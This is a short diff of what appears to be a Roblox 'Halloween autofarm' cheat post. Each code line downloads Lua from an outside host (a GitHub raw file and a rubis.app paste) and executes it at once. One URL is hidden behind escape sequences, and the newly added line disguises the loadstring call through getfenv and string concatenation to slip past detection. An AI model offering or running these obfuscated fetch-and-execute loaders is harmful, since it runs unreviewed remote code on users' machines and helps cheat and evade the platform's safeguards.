@@ -2,6 +2,9 @@
 loadstring(game:HttpGet("https\058\047\047raw\046githubusercontent\046com/Script\115\076\117\097\067\111\100\101\114/Halloween/refs/heads/main/AutoFarm"))()
 
 
-
 🎃HALLOWEEN AUTOFARM👻👇
 loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/pqsv64Df4ALr4avq/raw"))()
+
+
+🎃HALLOWEEN AUTOFARM👻👇
+getfenv()["load".."string"](game:HttpGet"https://api.rubis.app/v2/scrap/pqsv64Df4ALr4avq/raw")()
